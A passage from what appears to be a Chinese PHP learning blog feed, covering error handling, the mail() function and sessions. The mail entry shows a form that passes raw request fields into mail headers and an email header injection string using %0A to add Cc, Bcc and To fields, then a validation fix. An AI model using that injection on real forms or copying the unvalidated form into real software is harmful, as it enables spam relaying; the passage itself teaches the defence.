class="php">$test=<span class="number">2</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($test&gt;<span class="number">1</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    trigger_error(<span class="string">"变量值必须小于等于 1"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>运行结果<br><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Notice</span>: 变量值必须小于等于 <span class="number">1</span></span><br><span class="line"><span class="keyword">in</span> /www/test/runoob.php <span class="keyword">on</span> <span class="type">line</span> <span class="number">5</span></span><br></pre></td></tr></table></figure><br>该例子是”test” 变量大于 “1”，就会发生错误</p><p>还可以添加的第二个参数，您能够规定所触发的错误类型</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// 错误处理函数</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">customError</span><span class="params">($errno, $errstr)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"&lt;b&gt;Error:&lt;/b&gt; [$errno] $errstr&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"脚本结束"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 设置错误处理函数</span></span></span><br><span class="line"><span class="php">set_error_handler(<span class="string">"customError"</span>,E_USER_WARNING);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 触发错误</span></span></span><br><span class="line"><span class="php">$test=<span class="number">2</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($test&gt;<span class="number">1</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    trigger_error(<span class="string">"变量值必须小于等于 1"</span>,E_USER_WARNING);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>运行结果<br><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Error: </span>[512] 变量值必须小于等于 1</span><br><span class="line">脚本结束</span><br></pre></td></tr></table></figure></p><h2 id="错误记录"><a href="#错误记录" class="headerlink" title="错误记录"></a>错误记录</h2><p>默认的情况下，根据php.ini中的error_log配置，向服务器的记录系统或文件发送错误记录。通过error_log()函数，可以向指定的文件或远程目的地发送错误记录</p><h2 id="通过E-Mail发送错误消息"><a href="#通过E-Mail发送错误消息" class="headerlink" title="通过E-Mail发送错误消息"></a>通过E-Mail发送错误消息</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// 错误处理函数</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">customError</span><span class="params">($errno, $errstr)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"&lt;b&gt;Error:&lt;/b&gt; [$errno] $errstr&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"已通知网站管理员"</span>;</span></span><br><span class="line"><span class="php">    error_log(<span class="string">"Error: [$errno] $errstr"</span>,<span class="number">1</span>,</span></span><br><span class="line"><span class="php">    <span class="string">"someone@example.com"</span>,<span class="string">"From: webmaster@example.com"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 设置错误处理函数</span></span></span><br><span class="line"><span class="php">set_error_handler(<span class="string">"customError"</span>,E_USER_WARNING);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 触发错误</span></span></span><br><span class="line"><span class="php">$test=<span class="number">2</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($test&gt;<span class="number">1</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    trigger_error(<span class="string">"变量值必须小于等于 1"</span>,E_USER_WARNING);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>运行结果<br><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Error: </span>[512] 变量值必须小于等于 1</span><br><span class="line">已通知网站管理员</span><br></pre></td></tr></table></figure><br>接收自以上代码地邮件如下所示<br><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Error: </span>[512] 变量值必须小于等于 1</span><br></pre></td></tr></table></figure><br>这个方法不适合所有的错误。常规错误应当通过使用默认的 PHP 记录系统在服务器上进行记录</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.直接使用die()函数来在遇到错误时终结程序运行，往往有时候是不太好的</p><p>2.set_error_handler() 仅需要一个参数，可以添加第二个参数来规定错误级别</p><p>3.触发错误使用trigger_error()函数来进行触发</p><p>4.set_error_handler(error_handler,error_type)其中error_handler是必须的，并且要与错误处理函数名称保持一致，error_type是可选项，可以设置错误级别</p><p>5.通过使用 error_log() 函数，您可以向指定的文件或远程目的地发送错误记录</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;error&quot;&gt;&lt;a href=&quot;#error&quot; class=&quot;headerlink&quot; title=&quot;error&quot;&gt;&lt;/a&gt;error&lt;/h1&gt;&lt;p&gt;在PHP中，默认的错误处理很简单。一条错误消息会被发送到浏览器，这条消息带有文件名、行号以及描述错误的消息&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="日常学习" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="PHP" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/PHP/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>PHP-2020/7/15-学习日记</title>
    <link href="http://yoursite.com/2020/07/15/PHP-2020-7-15-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/07/15/PHP-2020-7-15-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</id>
    <published>2020-07-15T12:24:27.000Z</published>
    <updated>2020-07-15T12:44:22.588Z</updated>
    
    <content type="html"><![CDATA[<h1 id="电子邮件"><a href="#电子邮件" class="headerlink" title="电子邮件"></a>电子邮件</h1><p>PHP允许直接从脚本发送电子邮件</p><h2 id="mail-函数"><a href="#mail-函数" class="headerlink" title="mail()函数"></a>mail()函数</h2><p>mail()函数用于从脚本中发送电子邮件</p><p>语法<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">mail</span><span class="params">(to,subject,message,headers,parameters)</span></span></span><br></pre></td></tr></table></figure><br>参数 | 描述</p><ul><li>| -<br>to | 必需。规定email接收者<br>subject | 必需。规定email的主题。注释：该参数不能包含任何新行字符<br>message | 必需。定义要发送的信息。应使用LF(\n)来分隔隔行。每行限制在70个字符内<br>headers | 可选。规定附加的标题，比如From、Cc和Bcc。应当使用CRLF(\r\n)分隔附加的标题<br>parameters | 可选。对邮件发送程序规定额外的参数</li></ul><h2 id="简易E-Mail"><a href="#简易E-Mail" class="headerlink" title="简易E-Mail"></a>简易E-Mail</h2><p>通过PHP发送电子邮件的最简单的方法是发送文本email</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$to = <span class="string">"someone@example.com"</span>;         <span class="comment">// 邮件接收者</span></span></span><br><span class="line"><span class="php">$subject = <span class="string">"Test"</span>;                <span class="comment">// 邮件标题</span></span></span><br><span class="line"><span class="php">$message = <span class="string">"Hello! 这是邮件的内容。"</span>;  <span class="comment">// 邮件正文</span></span></span><br><span class="line"><span class="php">$from = <span class="string">"someonelse@example.com"</span>;   <span class="comment">// 邮件发送者</span></span></span><br><span class="line"><span class="php">$headers = <span class="string">"From:"</span> . $from;         <span class="comment">// 头部信息设置</span></span></span><br><span class="line"><span class="php">mail($to,$subject,$message,$headers);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"邮件已发送"</span>;</span></span><br></pre></td></tr></table></figure><h2 id="Mail表单"><a href="#Mail表单" class="headerlink" title="Mail表单"></a>Mail表单</h2><p>通过PHP，可以在站点下制作一个反馈表单。下面的实例向指定的e-mail地址发送一条文本消息<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'email'</span>])) &#123; <span class="comment">// 如果接收到邮箱参数则发送邮件</span></span></span><br><span class="line"><span class="php">    <span class="comment">// 发送邮件</span></span></span><br><span class="line"><span class="php">    $email = $_REQUEST[<span class="string">'email'</span>] ;</span></span><br><span class="line"><span class="php">    $subject = $_REQUEST[<span class="string">'subject'</span>] ;</span></span><br><span class="line"><span class="php">    $message = $_REQUEST[<span class="string">'message'</span>] ;</span></span><br><span class="line"><span class="php">    mail(<span class="string">"someone@example.com"</span>, $subject,</span></span><br><span class="line"><span class="php">    $message, <span class="string">"From:"</span> . $email);</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"邮件发送成功"</span>;</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123; <span class="comment">// 如果没有邮箱参数则显示表单</span></span></span><br><span class="line">    echo "&lt;form method='post' action='mailform.php'&gt;</span><br><span class="line">    Email: &lt;input name='email' type='text'&gt;&lt;br&gt;</span><br><span class="line">    Subject: &lt;input name='subject' type='text'&gt;&lt;br&gt;</span><br><span class="line">    Message:&lt;br&gt;</span><br><span class="line">    &lt;textarea name='message' rows='15' cols='40'&gt;</span><br><span class="line">    &lt;/textarea&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type='submit'&gt;</span><br><span class="line"><span class="php">    &lt;/form&gt;<span class="string">";</span></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><ul><li>首先，检查是否填写了邮件输入框</li><li>如果未填写，输出HTML表单</li><li>如果已填写，从表单发送电子邮件</li><li>当填写完表单点击提交按钮后，页面重新载入，可以看到邮件输入被重置，同时显示邮件发送成功的消息</li></ul><p>更多mail()函数信息可以参考手册<br><a href="https://www.runoob.com/php/php-ref-mail.html" target="_blank" rel="noopener">https://www.runoob.com/php/php-ref-mail.html</a></p><h2 id="E-mail注入"><a href="#E-mail注入" class="headerlink" title="E-mail注入"></a>E-mail注入</h2><p>就在上面的例子中，其实是存在安全问题</p><p>上面代码存在的问题是：未经授权的用户可以通过输入表单在邮件头部插入数据</p><p>例如插入<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">someone@</span>example.com%<span class="number">0</span>ACc:<span class="symbol">person2@</span>example.com</span><br><span class="line">%<span class="number">0</span>ABcc:<span class="symbol">person3@</span>example.com,<span class="symbol">person3@</span>example.com,</span><br><span class="line"><span class="symbol">anotherperson4@</span>example.com,<span class="symbol">person5@</span>example.com</span><br><span class="line">%<span class="number">0</span>ABTo:<span class="symbol">person6@</span>example.com</span><br></pre></td></tr></table></figure><br>由于是正常语法，mail()函数会把上面的文本放入邮件头部，现在头部就有了额外的Cc: Bcc: To:字段。当用户点击提交时便会发送到上面所有的地址</p><h2 id="防止E-mail注入"><a href="#防止E-mail注入" class="headerlink" title="防止E-mail注入"></a>防止E-mail注入</h2><p>防止最好的方法就是对输入的内容进行验证</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">spamcheck</span><span class="params">($field)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// filter_var() 过滤 e-mail</span></span></span><br><span class="line"><span class="php">    <span class="comment">// 使用 FILTER_SANITIZE_EMAIL</span></span></span><br><span class="line"><span class="php">    $field=filter_var($field, FILTER_SANITIZE_EMAIL);</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="comment">//filter_var() 过滤 e-mail</span></span></span><br><span class="line"><span class="php">    <span class="comment">// 使用 FILTER_VALIDATE_EMAIL</span></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(filter_var($field, FILTER_VALIDATE_EMAIL))</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'email'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// 如果接收到邮箱参数则发送邮件</span></span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="comment">// 判断邮箱是否合法</span></span></span><br><span class="line"><span class="php">    $mailcheck = spamcheck($_REQUEST[<span class="string">'email'</span>]);</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($mailcheck==<span class="keyword">FALSE</span>)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"非法输入"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span></span></span><br><span class="line"><span class="php">    &#123;    </span></span><br><span class="line"><span class="php">        <span class="comment">// 发送邮件</span></span></span><br><span class="line"><span class="php">        $email = $_REQUEST[<span class="string">'email'</span>] ;</span></span><br><span class="line"><span class="php">        $subject = $_REQUEST[<span class="string">'subject'</span>] ;</span></span><br><span class="line"><span class="php">        $message = $_REQUEST[<span class="string">'message'</span>] ;</span></span><br><span class="line"><span class="php">        mail(<span class="string">"someone@example.com"</span>, <span class="string">"Subject: $subject"</span>,</span></span><br><span class="line"><span class="php">        $message, <span class="string">"From: $email"</span> );</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"Thank you for using our mail form"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123; </span></span><br><span class="line"><span class="php">    <span class="comment">// 如果没有邮箱参数则显示表单</span></span></span><br><span class="line">    echo "&lt;form method='post' action='mailform.php'&gt;</span><br><span class="line">    Email: &lt;input name='email' type='text'&gt;&lt;br&gt;</span><br><span class="line">    Subject: &lt;input name='subject' type='text'&gt;&lt;br&gt;</span><br><span class="line">    Message:&lt;br&gt;</span><br><span class="line">    &lt;textarea name='message' rows='15' cols='40'&gt;</span><br><span class="line">    &lt;/textarea&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type='submit'&gt;</span><br><span class="line"><span class="php">    &lt;/form&gt;<span class="string">";</span></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面这个例子使用了过滤器来对输入进行验证</p><ul><li>FILTER_SANITIZE_EMAIL 过滤器从字符串中删除电子邮件的非法字符</li><li>FILTER_VALIDATE_EMAIL 过滤器验证电子邮件地址的值</li><li>filter_var()通过指定的过滤器过滤，语法为<code>filter_var(variable, filter, options)</code>;如果成功，则返回已过滤的数据，如果失败，则返回 false</li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.电子邮件的发送使用mail()函数进行，可以事先定义好相关变量，必要的变量是to：接收者 subject：主题 message：发送的消息，发送者一般使用from变量 并添加在headers中</p><p>2.也可以使用表单来发送e-mail</p><p>3.编写e-mail表单时，要注意使用过滤器验证用户输入的合法性，不能过分相信用户输入，避免出现安全问题</p><p>4.常见的e-mail过滤器为<code>FILTER_SANITIZE_EMAIL</code> 过滤器从字符串中删除电子邮件的非法字符<br><code>FILTER_VALIDATE_EMAIL</code> 过滤器验证电子邮件地址的值<br>使用filter_var()函数来进行过滤</p><p>5.具体关于Filter的内容可以参考手册<a href="https://www.runoob.com/php/php-filter.html，后面会学到" target="_blank" rel="noopener">https://www.runoob.com/php/php-filter.html，后面会学到</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;电子邮件&quot;&gt;&lt;a href=&quot;#电子邮件&quot; class=&quot;headerlink&quot; title=&quot;电子邮件&quot;&gt;&lt;/a&gt;电子邮件&lt;/h1&gt;&lt;p&gt;PHP允许直接从脚本发送电子邮件&lt;/p&gt;
&lt;h2 id=&quot;mail-函数&quot;&gt;&lt;a href=&quot;#mail-函数&quot; class
      
    
    </summary>
    
    
      <category term="日常学习" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="PHP" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/PHP/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>PHP-2020/7/14-学习日记</title>
    <link href="http://yoursite.com/2020/07/14/PHP-2020-7-14-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/07/14/PHP-2020-7-14-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</id>
    <published>2020-07-14T12:57:04.000Z</published>
    <updated>2020-07-14T13:07:33.846Z</updated>
    
    <content type="html"><![CDATA[<h1 id="session"><a href="#session" class="headerlink" title="session"></a>session</h1><p>PHP session变量用于存储关于用户会话(session)的信息，或者更改用户会话(session)的设置。Session变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的</p><h2 id="session变量"><a href="#session变量" class="headerlink" title="session变量"></a>session变量</h2><p>当在计算机上操作某个应用程序(打开，修改，关闭)。这就很想一次会话(session)。计算机知道你是谁，何时打开和关闭程序。但是当网络出现问题时，HTTP地址就无法保持状态，Web服务器就不知道你是谁和干了什么</p><p>session就是为了解决这个问题而存储在服务器上的用户信息，方便用户使用而产生的</p><p>session的工作机制是为每一个访客创建一个唯一的id,基于这个UID来存储变量，UID存储到cookie中，或通过URL传导</p><h2 id="启动session"><a href="#启动session" class="headerlink" title="启动session"></a>启动session</h2><p>在存储到session之前，必须启动会话</p><p>session_start()函数必须位于<code>&lt;html&gt;</code>标签之前</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> session_start(); <span class="meta">?&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>该代码会向服务器注册用户的会话，以便可以开始保存用户信息，同时会分配一个UID</p><h2 id="存储session变量"><a href="#存储session变量" class="headerlink" title="存储session变量"></a>存储session变量</h2><p>存储和取回session变量是使用$_SESSION变量<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php"><span class="comment">// 存储 session 数据</span></span></span><br><span class="line"><span class="php">$_SESSION[<span class="string">'views'</span>]=<span class="number">1</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// 检索 session 数据</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"浏览量："</span>. $_SESSION[<span class="string">'views'</span>];</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">浏览量：<span class="number">1</span></span><br></pre></td></tr></table></figure></p><h2 id="销毁session"><a href="#销毁session" class="headerlink" title="销毁session"></a>销毁session</h2><p>希望删除某些session变量，可以使用unset()或session_destroy()函数</p><p>unset()函数用于释放指定的session变量<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'views'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">unset</span>($_SESSION[<span class="string">'views'</span>]);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>也可以通过调用session_destroy()函数彻底销毁session<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_destroy();</span><br></pre></td></tr></table></figure></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.使用session前，需要在<code>&lt;html&gt;</code>标签之前使用session_start()函数</p><p>2.使用session_start()函数之后，服务器便会注册用户的会话，并开始保存用户信息，同时会分配UID</p><p>3.存储session变量使用$_SESSION直接创建和赋值</p><p>4.unset()可以销毁指定的session变量，而调用session_destroy()便会失去所有已存储的session数据</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;session&quot;&gt;&lt;a href=&quot;#session&quot; class=&quot;headerlink&quot; title=&quot;session&quot;&gt;&lt;/a&gt;session&lt;/h1&gt;&lt;p&gt;PHP session变量用于存储关于用户会话(session)的信息，或者更改用户会话(sessi
      
    
    </summary>
    
    
      <category term="日常学习" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="PHP" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/PHP/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
